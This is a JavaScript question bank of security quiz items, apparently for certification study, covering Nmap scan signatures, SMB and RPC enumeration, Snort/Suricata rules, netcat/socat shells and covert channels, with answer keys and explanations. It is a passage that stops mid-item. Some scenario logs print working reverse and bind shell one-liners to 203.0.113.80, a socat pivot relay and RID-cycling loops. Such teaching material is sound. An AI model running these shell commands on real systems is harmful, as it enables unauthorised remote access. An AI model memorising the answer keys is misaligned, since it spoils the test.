// Domain 2 — Recon, Scanning & Network Detection
// Nmap signatures, SMB/service enumeration, Snort/Suricata rules, Netcat/Socat, covert channels.
const r = String.raw;

export const questionsD2 = [
  {
    id: 'd2-q01',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: r`$ tcpdump -nn -r scan.pcap 'host 10.20.9.15' | head -6
06:01:00.001 IP 172.16.5.9.44310 > 10.20.9.15.22: Flags [S], seq 1100, win 1024, options [mss 1460], length 0
06:01:00.001 IP 10.20.9.15.22 > 172.16.5.9.44310: Flags [S.], seq 9900, ack 1101, length 0
06:01:00.002 IP 172.16.5.9.44310 > 10.20.9.15.22: Flags [R], seq 1101, length 0
06:01:00.002 IP 172.16.5.9.44310 > 10.20.9.15.23: Flags [S], seq 1100, win 1024, length 0
06:01:00.003 IP 10.20.9.15.23 > 172.16.5.9.44310: Flags [R.], seq 0, ack 1101, length 0`,
    question: 'Which Nmap scan type produced this traffic?',
    options: [
      'SYN "half-open" scan (-sS)',
      'TCP connect scan (-sT)',
      'ACK scan (-sA)',
      'FIN scan (-sF)',
    ],
    correctIndex: 0,
    explanation: 'The scanner sends SYN, receives SYN-ACK from the open port 22, and immediately sends RST instead of completing the handshake: a SYN (half-open) scan, Nmap\'s default when run as root. The tell-tale win 1024 and reused source port also match Nmap raw-packet scans. A connect scan completes the handshake with an ACK. ACK and FIN scans do not send SYNs.',
  },
  {
    id: 'd2-q02',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`06:05:11.200 IP 172.16.5.9.61001 > 10.20.9.15.80: Flags [FPU], seq 1, win 1024, urg 0, length 0
06:05:11.201 IP 172.16.5.9.61001 > 10.20.9.15.81: Flags [FPU], seq 1, win 1024, urg 0, length 0
06:05:11.202 IP 10.20.9.15.81 > 172.16.5.9.61001: Flags [R.], seq 0, ack 2, length 0`,
    question: 'What scan is shown, and what does no response on port 80 mean?',
    options: [
      'Xmas scan (-sX); no response means open|filtered per RFC 793 behavior',
      'Null scan (-sN); no response means closed',
      'Maimon scan; no response means the host is down',
      'Window scan; no response means open',
    ],
    correctIndex: 0,
    explanation: 'FIN+PSH+URG lights up the packet "like a Christmas tree": an Xmas scan. Under RFC 793, closed ports respond with RST, while open ports silently drop the packet, so silence means open|filtered (a firewall could also drop it). Null scans set no flags. Windows hosts send RST for everything, making these scans unreliable against them.',
  },
  {
    id: 'd2-q03',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap -sV -sC -p 139,445 10.20.9.30
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Host script results:
| smb-security-mode:
|   message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|_  3.1.1: Message signing enabled but not required`,
    question: 'Which attack does this finding most directly enable?',
    options: [
      'Pass-the-ticket using a golden ticket',
      'Kerberoasting',
      'DNS zone transfer',
      'SMB relay (NTLM relay) attacks such as ntlmrelayx targeting this host',
    ],
    correctIndex: 3,
    explanation: 'When SMB signing is not required, captured NTLM authentications (e.g., from Responder/LLMNR poisoning) can be relayed to the host to execute commands or dump secrets with tools like Impacket ntlmrelayx. Kerberoasting targets SPN service accounts, zone transfers are DNS, and golden tickets require the krbtgt hash.',
  },
  {
    id: 'd2-q04',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"Possible SMB scan"; flags:S; detection_filter:track by_src, count 30, seconds 60; sid:1000101; rev:1;)',
    question: 'What does detection_filter do in this Snort/Suricata rule?',
    options: [
      'It only begins alerting after a single source has sent more than 30 matching SYNs to port 445 within 60 seconds',
      'It alerts on the first SYN and suppresses all later alerts',
      'It drops packets from the source for 60 seconds',
      'It tracks the destination host and alerts once per 30 seconds',
    ],
    correctIndex: 0,
    explanation: 'detection_filter sets a rate threshold: the rule only fires once the count is exceeded within the time window for the tracked entity (by_src here). It is ideal for scan detection. It does not drop traffic (that would be a drop/reject action in inline mode), and "threshold/event_filter type limit" is what limits repeated alerts.',
  },
  {
    id: 'd2-q05',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: r`attacker$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [203.0.113.80] from (UNKNOWN) [198.51.100.23] 50110
victim$ nc 203.0.113.80 4444 -e /bin/bash`,
    question: 'What type of shell has been established?',
    options: [
      'Bind shell: the victim listens and the attacker connects in',
      'Reverse shell: the victim connects outbound to the attacker listener and attaches /bin/bash',
      'Web shell',
      'Encrypted SSH shell',
    ],
    correctIndex: 1,
    explanation: 'The attacker listens (-l -v -n -p 4444) and the victim initiates the outbound connection with -e /bin/bash, a reverse shell. Reverse shells evade inbound firewall rules because most egress is allowed. A bind shell would have the victim running nc -l -p ... -e. Netcat traffic is cleartext, unlike SSH.',
  },
  {
    id: 'd2-q06',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap -sU -p 161 --script snmp-info 10.20.9.0/24
PORT    STATE         SERVICE
161/udp open|filtered snmp`,
    question: 'Why do UDP scans frequently report "open|filtered"?',
    options: [
      'An open UDP service often ignores an empty probe, and a firewall drop also yields no response; only an ICMP port unreachable definitively indicates closed',
      'UDP ports never respond to anything',
      'Nmap does not support UDP',
      'SNMP always runs on TCP',
    ],
    correctIndex: 0,
    explanation: 'For UDP, a closed port usually returns ICMP type 3 code 3 (port unreachable). No response is ambiguous: open service that ignored the probe or filtered. Nmap sends protocol-specific payloads (e.g., SNMP GetRequest) to elicit replies, and -sV helps resolve ambiguity. SNMP is UDP 161/162.',
  },
  {
    id: 'd2-q07',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ smbclient -L //10.20.9.30 -N
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Finance         Disk
	Backups         Disk      Nightly SQL dumps`,
    question: 'What did the -N option allow the tester to do, and why is the result concerning?',
    options: [
      '-N enables NTLMv2; the result is normal',
      '-N suppresses the password prompt (anonymous/null session); share enumeration without credentials reveals sensitive shares like Backups',
      '-N uses NetBIOS over TCP only; it shows only hidden shares',
      '-N performs a brute-force attack',
    ],
    correctIndex: 1,
    explanation: 'smbclient -N means "no password," attempting a null/anonymous session. Being able to list shares anonymously leaks structure and often access; a "Backups" share with SQL dumps is high-value. Restrict anonymous access (RestrictAnonymous, disable SMBv1 and guest). Hidden admin shares end in $.',
  },
  {
    id: 'd2-q08',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: r`alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Suspicious UA Beacon"; flow:established,to_server; http.user_agent; content:"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"; http.uri; pcre:"/^\/[a-z]{4}\.php$/"; sid:2000777; rev:2;)`,
    question: 'Which statement describes this Suricata rule?',
    options: [
      'pcre here matches the User-Agent header',
      'It uses Snort 2 rawbytes to match TCP payloads only',
      'It will match server responses',
      'It uses sticky buffers (http.user_agent, http.uri) to match a specific legacy User-Agent and a URI of exactly four lowercase letters followed by .php',
    ],
    correctIndex: 3,
    explanation: 'In Suricata, sticky buffers like http.user_agent and http.uri set the inspection buffer for the following content/pcre. flow:established,to_server restricts to client-to-server traffic. An outdated IE7/XP User-Agent combined with short random PHP gates is a common C2 heuristic. pcre applies to http.uri because it follows that buffer.',
  },
  {
    id: 'd2-q09',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: r`$ nmap -sn 10.20.9.0/24
Nmap scan report for 10.20.9.1
Host is up (0.00041s latency).
Nmap scan report for 10.20.9.15
Host is up (0.00052s latency).
Nmap done: 256 IP addresses (2 hosts up)`,
    question: 'What does -sn do?',
    options: [
      'Performs a SYN scan without DNS resolution',
      'Scans the top 1000 ports silently',
      'Host discovery only (ping sweep) with no port scan',
      'Performs a NULL scan',
    ],
    correctIndex: 2,
    explanation: '-sn (formerly -sP) disables port scanning, doing host discovery only. As root on a local LAN Nmap uses ARP; otherwise ICMP echo, TCP SYN 443, TCP ACK 80, and ICMP timestamp. -n disables DNS, -sS is SYN, and -sN is NULL.',
  },
  {
    id: 'd2-q10',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: '$ socat OPENSSL-LISTEN:443,cert=srv.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane',
    question: 'Why might an attacker prefer this socat command over a classic netcat shell?',
    options: [
      'It only works on Windows',
      'socat cannot be detected by EDR',
      'It creates a VPN tunnel to the attacker',
      'It provides an encrypted (TLS) interactive bind shell with a full PTY on port 443, blending with HTTPS and defeating payload inspection',
    ],
    correctIndex: 3,
    explanation: 'OPENSSL-LISTEN wraps the shell in TLS, so IDS content signatures for shell commands no longer match, and port 443 looks like normal HTTPS. The pty options give a fully interactive TTY (job control, su, sudo prompts). Defenders still see a listening process spawning bash, unusual certificates (JA3/JA3S), and odd process lineage.',
  },
  {
    id: 'd2-q11',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: '$ nmap -sI 10.20.9.77:80 10.20.9.15 -Pn -p 22,80,445',
    question: 'What is unique about this scan from the target\'s point of view?',
    options: [
      'The target sees an ICMP flood',
      'The target sees probes appearing to come from 10.20.9.77, the "zombie," not from the attacker; open ports are inferred from the zombie\'s IP ID increments',
      'The scan is fully encrypted',
      'The target receives decoy packets from random IPs',
    ],
    correctIndex: 1,
    explanation: 'An idle (zombie) scan spoofs the zombie\'s address when sending SYNs to the target. If the target port is open it SYN-ACKs the zombie, which RSTs and increments its IP ID. The attacker probes the zombie\'s IP ID before and after to infer state. It requires a zombie with predictable, globally incrementing IP IDs and little traffic. Decoys (-D) mix in fake sources but still include the real one.',
  },
  {
    id: 'd2-q12',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ enum4linux-ng -A 10.20.9.30 | grep -A4 "Users via RPC"
[+] Found 4 users via 'querydispinfo'
username: Administrator  rid: 0x1f4
username: svc_sql        rid: 0x44f
username: jdoe           rid: 0x450
username: backup_admin   rid: 0x451`,
    question: 'Which underlying technique did the tool use to obtain usernames?',
    options: [
      'MS-RPC over SMB (SAMR/LSARPC) queries via a null or low-privileged session, including RID cycling',
      'LDAP anonymous bind on 389',
      'Kerberos AS-REQ brute forcing',
      'SNMP walk of the hrSWRun table',
    ],
    correctIndex: 0,
    explanation: 'enum4linux(-ng) wraps rpcclient/smbclient to query SAMR and LSARPC over the IPC$ share (querydispinfo, enumdomusers, lookupsids for RID cycling). The RID 0x1f4 = 500 is the built-in Administrator. LDAP, Kerberos user enumeration (kerbrute), and SNMP are other enumeration avenues but not what is shown.',
  },
  {
    id: 'd2-q13',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: 'alert tcp any any -> $HOME_NET 22 (msg:"SSH brute force"; flow:to_server; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:1000200;)',
    question: 'What does "threshold: type both" mean?',
    options: [
      'Alert on every packet',
      'Alert once per tracking period, and only after the count threshold is reached',
      'Alert on both TCP and UDP',
      'Alert in both directions of the flow',
    ],
    correctIndex: 1,
    explanation: 'threshold type "limit" caps alerts per period, "threshold" alerts every Nth match, and "both" combines them: alert once per 60 seconds per source after 5 matches. It does not change protocol or direction. Modern Snort/Suricata prefer event_filter/threshold.config but the semantics are the same.',
  },
  {
    id: 'd2-q14',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap -O 10.20.9.15
Device type: general purpose
Running: Linux 5.X
OS details: Linux 5.0 - 5.14
Network Distance: 1 hop`,
    question: 'How does Nmap determine the operating system with -O?',
    options: [
      'By reading the HTTP Server header',
      'By sending crafted TCP/UDP/ICMP probes and comparing responses (TTL, window size, TCP options, IP ID behavior) to a fingerprint database',
      'By logging in via SSH',
      'By querying the DHCP server',
    ],
    correctIndex: 1,
    explanation: 'Active OS fingerprinting sends a series of probes, including to open and closed ports, and compares quirks such as initial TTL, window size, TCP option ordering, and IP ID sequence generation against nmap-os-db. It needs at least one open and one closed port for best accuracy. Banner grabbing is what -sV does.',
  },
  {
    id: 'd2-q15',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: r`$ tshark -r egress.pcap -Y "http.request" -T fields -e http.host -e http.cookie | head -3
cdn-img.net   SESSID=dXNlcj1hZG1pbjtob3N0PUZJTi1XUzIy
cdn-img.net   SESSID=Y21kPXdob2FtaTtyZXN1bHQ9ZmluXGpkb2U=
cdn-img.net   SESSID=Y21kPWlwY29uZmlnO3Jlc3VsdD0uLi4=`,
    question: 'What covert channel technique does this traffic suggest?',
    options: [
      'Data hidden in HTTP Cookie headers: base64 values decode to commands/results (cmd=whoami;result=...)',
      'Steganography in images',
      'DNS over HTTPS',
      'TCP sequence number encoding',
    ],
    correctIndex: 0,
    explanation: r`The cookie values base64-decode to strings like "cmd=whoami;result=fin\jdoe", so the C2 is carried in HTTP headers that look like ordinary session cookies. Detection: entropy and length of cookies, varying cookie values per request to one host, and decoding. No image payloads or DoH are shown.`,
  },
  {
    id: 'd2-q16',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap -sV --version-intensity 9 -p 8443 10.20.9.40
PORT     STATE SERVICE  VERSION
8443/tcp open  ssl/http Apache Tomcat 9.0.30`,
    question: 'From an incident handler\'s perspective, why is service version detection valuable on internal assets?',
    options: [
      'It patches vulnerable services automatically',
      'It encrypts the service',
      'It identifies exact software versions to map against known CVEs (e.g., Ghostcat CVE-2020-1938 for older Tomcat) and prioritize exposure',
      'It confirms the host is not compromised',
    ],
    correctIndex: 2,
    explanation: '-sV probes services and matches responses against nmap-service-probes. Knowing Tomcat 9.0.30 lets you check advisories (Ghostcat affected < 9.0.31 via AJP 8009). It does not patch, encrypt, or prove anything about compromise.',
  },
  {
    id: 'd2-q17',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: 'victim$ mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.80 9001 > /tmp/f',
    question: 'Why does the attacker use a named pipe (mkfifo) here?',
    options: [
      'To create a reverse shell with a netcat build that lacks the -e option, wiring nc output into sh input and sh output back to nc',
      'To encrypt the shell',
      'To persist across reboots',
      'To hide the process from ps',
    ],
    correctIndex: 0,
    explanation: 'Many distributions ship OpenBSD netcat without -e/-c. The FIFO creates a loop: data from nc is written into /tmp/f, which cat feeds to sh, and sh output goes back through nc. It provides no encryption, persistence, or hiding. Hunting tip: look for mkfifo plus nc/sh in command-line telemetry and /tmp fifos.',
  },
  {
    id: 'd2-q18',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: '$ nmap -sT -p- 10.20.9.15',
    question: 'Why would an attacker use -sT instead of -sS?',
    options: [
      '-sT is stealthier',
      '-sT avoids logging',
      '-sT is faster on UDP',
      '-sT completes the full three-way handshake using the OS connect() call and works without root/raw socket privileges',
    ],
    correctIndex: 3,
    explanation: 'A TCP connect scan uses the normal socket API, so unprivileged users can run it (and it works through some proxies). It is noisier: completed connections are often logged by the application and appear in connection tables. -p- means all 65,535 ports.',
  },
  {
    id: 'd2-q19',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: r`alert dns $HOME_NET any -> any 53 (msg:"Possible DNS tunnel - long query"; dns.query; content:"."; pcre:"/^[A-Za-z0-9+\/=]{50,}\./"; threshold: type threshold, track by_src, count 20, seconds 60; sid:3000001;)`,
    question: 'What is the detection logic of this rule?',
    options: [
      'Matches DNS responses with large TXT records',
      'Blocks all DNS queries longer than 50 bytes',
      'Fires every 20th DNS query from a source within 60 s whose first label is 50+ base64-alphabet characters',
      'Alerts on DNS queries to port 50',
    ],
    correctIndex: 2,
    explanation: 'dns.query is the Suricata sticky buffer for the query name; the pcre requires a leading label of 50+ base64 characters. type threshold alerts once per every 20 matches in the window. It is an alert (not drop) rule and inspects queries, not responses.',
  },
  {
    id: 'd2-q20',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap --script smb-enum-shares,smb-os-discovery -p445 10.20.9.30
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393
|   Computer name: FS01
|   Domain name: corp.local
|_  System time: 2026-03-14T06:22:01-05:00`,
    question: 'Which Nmap feature is being used?',
    options: [
      'Zenmap topology view',
      'Nmap OS fingerprinting (-O)',
      'Nmap Scripting Engine (NSE) Lua scripts for SMB enumeration',
      'Ncat brokering',
    ],
    correctIndex: 2,
    explanation: '--script runs NSE scripts (Lua) in categories such as default, discovery, safe, vuln, and intrusive. smb-os-discovery queries SMB to learn OS, hostname, and domain; this is protocol-level enumeration, not TCP/IP fingerprinting.',
  },
  {
    id: 'd2-q21',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`06:30:01 IP 172.16.5.9 > 10.20.9.15: ICMP echo request, id 512, seq 1, length 8
06:30:01 IP 172.16.5.9.53122 > 10.20.9.15.443: Flags [S], length 0
06:30:01 IP 172.16.5.9.53122 > 10.20.9.15.80: Flags [.], ack 1, length 0
06:30:01 IP 172.16.5.9 > 10.20.9.15: ICMP time stamp query id 4021 seq 0, length 20`,
    question: 'This burst of four probes is the signature of what?',
    options: [
      'An SSL handshake',
      'A Smurf attack',
      'A traceroute',
      'Nmap default host discovery when run with privileges against a non-local target',
    ],
    correctIndex: 3,
    explanation: 'Nmap\'s default privileged discovery for remote networks sends ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp request. Seeing this pattern quickly identifies Nmap reconnaissance. Smurf uses broadcast pings, traceroute increments TTL, and an SSL handshake would follow a completed TCP handshake.',
  },
  {
    id: 'd2-q22',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'In Snort/Suricata rule syntax, what is the "sid" option used for?',
    options: [
      'Session ID tracking',
      'Severity ID',
      'The source IP address',
      'A unique signature identifier for the rule; local rules typically use 1,000,000 and above',
    ],
    correctIndex: 3,
    explanation: 'sid uniquely identifies a rule, and rev tracks revisions. Snort reserves < 1,000,000 for official rules, so local custom rules use 1000000+. Severity is set by classtype/priority, and source IP is in the rule header.',
  },
  {
    id: 'd2-q23',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: r`$ tcpdump -nn -r covert.pcap 'tcp and src host 10.20.4.88' -v | grep -o "id [0-9]*" | head -6
id 18533
id 27756
id 28448
id 30575
id 29292
id 25633`,
    question: 'The IP ID values convert to hex 0x4865 0x6c6c 0x6f20 0x776f 0x726c 0x6421. What is happening?',
    options: [
      'Normal incrementing IP IDs',
      'TCP sequence prediction',
      'IP fragmentation attack',
      'A covert storage channel: ASCII text ("Hello world!") is encoded two bytes at a time in the IP identification field',
    ],
    correctIndex: 3,
    explanation: 'Each 16-bit IP ID holds two ASCII bytes (0x4865 = "He", 0x6c6c = "ll", 0x6f20 = "o ", and so on), so data is being smuggled in a header field, a classic covert storage channel (e.g., covert_tcp). Normal IP IDs are sequential or random, not printable ASCII pairs. Detection requires header-field analysis rather than payload signatures.',
  },
  {
    id: 'd2-q24',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: '$ nmap -D RND:10 -sS -p 80,443 10.20.9.15',
    question: 'How will this scan appear in the target\'s IDS logs?',
    options: [
      'As an idle scan via a zombie',
      'Only from 10 random IPs; the attacker IP is hidden completely',
      'Probes from the attacker IP plus 10 random spoofed decoy IPs, making it harder to identify the true scanner',
      'As encrypted traffic',
    ],
    correctIndex: 2,
    explanation: '-D adds decoys; RND:10 generates ten random addresses. The real IP must still be included so responses come back, which means TTL analysis and the responding to the real source can still unmask the scanner. Idle scan (-sI) is the technique that hides the attacker completely.',
  },
  {
    id: 'd2-q25',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`C:\> netstat -anob | findstr 4444
  TCP    0.0.0.0:4444    0.0.0.0:0    LISTENING    7788
 [ncat.exe]
C:\> wmic process where processid=7788 get commandline
ncat.exe -lvp 4444 --ssl -e cmd.exe --allow 203.0.113.80`,
    question: 'What does this ncat configuration do?',
    options: [
      'A port scanner limited to one IP',
      'A TLS-encrypted bind shell on 4444 that only accepts connections from 203.0.113.80',
      'An HTTP proxy',
      'A reverse shell to 203.0.113.80',
    ],
    correctIndex: 1,
    explanation: 'Nmap\'s ncat adds --ssl encryption and --allow/--deny ACLs. Listening (-l) with -e cmd.exe makes it a bind shell; --allow restricts who can connect, preventing others from hijacking the backdoor. netstat -b shows the owning binary, which helps correlate PIDs during live response.',
  },
  {
    id: 'd2-q26',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: '$ nmap -T5 --min-rate 5000 -p- 10.20.9.0/24',
    question: 'What is the defensive implication of this scan configuration?',
    options: [
      'It is very stealthy',
      'It only scans UDP',
      'It is extremely fast and noisy, easily triggering threshold-based IDS rules and possibly dropping results',
      'It bypasses firewalls automatically',
    ],
    correctIndex: 2,
    explanation: '-T5 (insane) and --min-rate push thousands of packets per second, which creates obvious spikes and trips scan detection. Slow timing (-T0/-T1) is used for evasion. -p- covers all TCP ports, and none of these options bypass firewalls.',
  },
  {
    id: 'd2-q27',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ rpcclient -U "" -N 10.20.9.30 -c "lookupnames administrator"
administrator S-1-5-21-3623811015-3361044348-30300820-500 (User: 1)
$ for i in $(seq 1100 1105); do rpcclient -U "" -N 10.20.9.30 -c "lookupsids S-1-5-21-3623811015-3361044348-30300820-$i"; done`,
    question: 'What technique is this?',
    options: [
      'LDAP injection',
      'Password spraying',
      'Kerberoasting',
      'RID cycling: obtaining the domain SID, then enumerating accounts by iterating relative IDs',
    ],
    correctIndex: 3,
    explanation: 'Looking up a known name reveals the domain SID; iterating RIDs with lookupsids maps SIDs back to account names, even when direct user listing is restricted. This is classic RID cycling over a null session. Mitigate by restricting anonymous SID/name translation.',
  },
  {
    id: 'd2-q28',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: 'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Reverse shell banner"; flow:established; content:"Microsoft Windows [Version"; depth:30; content:"(c) Microsoft Corporation"; distance:0; within:80; sid:1000300;)',
    question: 'What are depth, distance, and within doing in this rule?',
    options: [
      'depth limits the first match to the first 30 bytes of payload; distance:0/within:80 require the second string to appear after the first, within 80 bytes',
      'They specify TCP window sizes',
      'They measure time between packets',
      'They are Suricata-only and ignored by Snort',
    ],
    correctIndex: 0,
    explanation: 'depth/offset constrain where the first content is searched from the start of the payload. distance/within are relative modifiers anchored to the end of the previous match. Here the rule catches cmd.exe\'s startup banner leaving the network, a strong reverse-shell indicator. These options exist in both Snort and Suricata.',
  },
  {
    id: 'd2-q29',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap -sA -p 22,80,443 10.20.9.15
PORT    STATE      SERVICE
22/tcp  unfiltered ssh
80/tcp  filtered   http
443/tcp unfiltered https`,
    question: 'What does an ACK scan tell the attacker?',
    options: [
      'Which ports are open',
      'Whether ports are filtered by a stateful firewall (unfiltered = RST received), useful for mapping firewall rule sets',
      'The OS version',
      'Which ports have vulnerabilities',
    ],
    correctIndex: 1,
    explanation: 'An unsolicited ACK should elicit RST from both open and closed ports, so ACK scans cannot distinguish open from closed. They reveal filtering: no response or ICMP unreachable means filtered. Attackers use them to map firewall rules before choosing techniques.',
  },
  {
    id: 'd2-q30',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: r`$ nc -nvz 10.20.9.15 20-25
(UNKNOWN) [10.20.9.15] 22 (ssh) open
(UNKNOWN) [10.20.9.15] 25 (smtp) open`,
    question: 'What is netcat doing with -z?',
    options: [
      'Creating a listener',
      'Compressing traffic',
      'Zero-I/O mode: port scanning without sending data',
      'Zone transfer',
    ],
    correctIndex: 2,
    explanation: '-z tells netcat to only check whether the port accepts a connection (connect scan) without sending data. -n skips DNS and -v prints results. It is a lightweight living-off-the-land scanner that defenders should expect from compromised Linux hosts.',
  },
  {
    id: 'd2-q31',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ zeek -r egress.pcap && cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes | sort -k4 -rn | head -3
10.20.4.22  185.220.101.4  443  86391.2  53211
10.20.4.31  52.84.10.12    443  12.3     4410
10.20.4.18  140.82.112.4   443  9.1      2210`,
    question: 'What does the first conn.log entry suggest?',
    options: [
      'A DNS amplification attack',
      'A normal short HTTPS session',
      'A long-lived (~24 hour) connection with small outbound volume, consistent with a persistent C2 channel or tunnel',
      'A failed connection',
    ],
    correctIndex: 2,
    explanation: 'A duration of 86,391 seconds is nearly a full day for a single TCP session; low bytes over that time is typical of an interactive or keep-alive C2 channel. Long-connection analysis (e.g., RITA) is a powerful hunting technique that is unaffected by encryption.',
  },
  {
    id: 'd2-q32',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: r`$ tshark -r ntp.pcap -Y "ntp" -T fields -e ip.src -e ip.dst -e udp.length | sort | uniq -c
    611 10.20.4.88  198.51.100.123  200
    611 198.51.100.123  10.20.4.88  200`,
    question: 'Why are these NTP packets suspicious?',
    options: [
      'NTP should use TCP',
      'Port 123 is reserved for SNMP',
      'NTP should never leave the network',
      'Standard NTP packets are 48 bytes of payload (UDP length 56); hundreds of 200-byte exchanges with one external host suggest data tunneled over NTP',
    ],
    correctIndex: 3,
    explanation: 'A basic NTPv4 packet carries 48 bytes (UDP length 56 with the 8-byte header). Uniform 200-byte packets in high volume to an external server indicate an NTP-based covert channel. NTP is UDP 123, and while internal time sources are best practice, outbound NTP is not inherently malicious.',
  },
  {
    id: 'd2-q33',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'Which Nmap option disables DNS resolution and is commonly used to reduce noise and speed up scans?',
    options: [
      '-R',
      '-n',
      '-sn',
      '-Pn',
    ],
    correctIndex: 1,
    explanation: '-n never resolves DNS. -R always resolves, -sn is host discovery only, and -Pn skips host discovery and treats all hosts as up (useful when ICMP is blocked).',
  },
  {
    id: 'd2-q34',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`[**] [1:2024897:3] ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine) [**]
[Classification: Web Application Attack] [Priority: 1]
06:40:11.882 172.16.5.9:55210 -> 10.20.9.40:8443
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)`,
    question: 'What does this alert tell you, and how could an attacker evade it?',
    options: [
      'It is a false positive because Nmap does not send HTTP',
      'The host is infected with Nmap malware',
      'NSE HTTP scripts ran against the host; the attacker can change the User-Agent with --script-args http.useragent="..."',
      'The alert proves exploitation succeeded',
    ],
    correctIndex: 2,
    explanation: 'NSE HTTP scripts use a default UA identifying Nmap, which Emerging Threats rules detect. It indicates scanning, not exploitation. Attackers can override it with the http.useragent script argument, so defenders should not rely solely on UA strings.',
  },
  {
    id: 'd2-q35',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ showmount -e 10.20.9.50
Export list for 10.20.9.50:
/home    *
/backups 10.20.0.0/16`,
    question: 'Why is the /home export a significant finding?',
    options: [
      'NFS cannot export /home',
      'It is exported to everyone (*), allowing any host to mount users\' home directories and potentially plant SSH keys or read secrets',
      'showmount output is always empty on secure hosts',
      'It means the server is a domain controller',
    ],
    correctIndex: 1,
    explanation: 'An NFS export to * lets any reachable host mount it. Combined with weak root_squash/UID mapping, an attacker can read .bash_history and keys or write ~/.ssh/authorized_keys. Restrict exports to specific hosts and use root_squash or NFSv4 with Kerberos.',
  },
  {
    id: 'd2-q36',
    domain: 2,
    difficulty: 'Hard',
    scenarioLog: '$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.30.1.10:3389',
    question: 'On a compromised dual-homed host, what does this command accomplish?',
    options: [
      'A port forwarder (relay) that exposes internal RDP on 10.30.1.10 via port 8080 on the compromised host, enabling pivoting',
      'A reverse shell',
      'An HTTP proxy with caching',
      'A DNS tunnel',
    ],
    correctIndex: 0,
    explanation: 'socat listens on 8080 and forwards each connection (fork) to 10.30.1.10:3389, letting the attacker reach an otherwise unreachable RDP server through the pivot. Netcat relays can do the same with FIFOs. Detection: unexpected listeners and process-level network connections from socat.',
  },
  {
    id: 'd2-q37',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ nmap -p 389 --script ldap-rootdse 10.20.9.5
| ldap-rootdse:
|   defaultNamingContext: DC=corp,DC=local
|   dnsHostName: DC01.corp.local
|   domainFunctionality: 7
|_  supportedSASLMechanisms: GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5`,
    question: 'What has the attacker learned?',
    options: [
      'All user passwords',
      'The krbtgt hash',
      'Domain naming context, DC hostname, and functional level, obtained from the RootDSE, which is readable without authentication',
      'That LDAP is disabled',
    ],
    correctIndex: 2,
    explanation: 'The LDAP RootDSE is intentionally readable anonymously so clients can discover capabilities. It reveals the domain DN, DC name and functional level (7 = Windows Server 2016), which inform later attacks like Kerberoasting or LDAP queries with low-privileged creds.',
  },
  {
    id: 'd2-q38',
    domain: 2,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'What is the main difference between an IDS and an IPS deployment?',
    options: [
      'An IPS is inline and can block/drop traffic; an IDS passively monitors a copy (SPAN/TAP) and alerts',
      'An IDS is signature-based and an IPS is anomaly-based',
      'An IDS only works on hosts',
      'There is no difference',
    ],
    correctIndex: 0,
    explanation: 'The difference is placement and action. Snort/Suricata can run as passive IDS on a span or tap, or inline (NFQUEUE/AF_PACKET) as an IPS using drop/reject actions. Both can be signature- or anomaly-based, and both exist in network and host variants.',
  },
  {
    id: 'd2-q39',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: r`$ cat /proc/net/tcp | awk 'NR>1 {print $2, $3, $4}' | head -3
0100007F:0277 00000000:0000 0A
00000000:115C 00000000:0000 0A
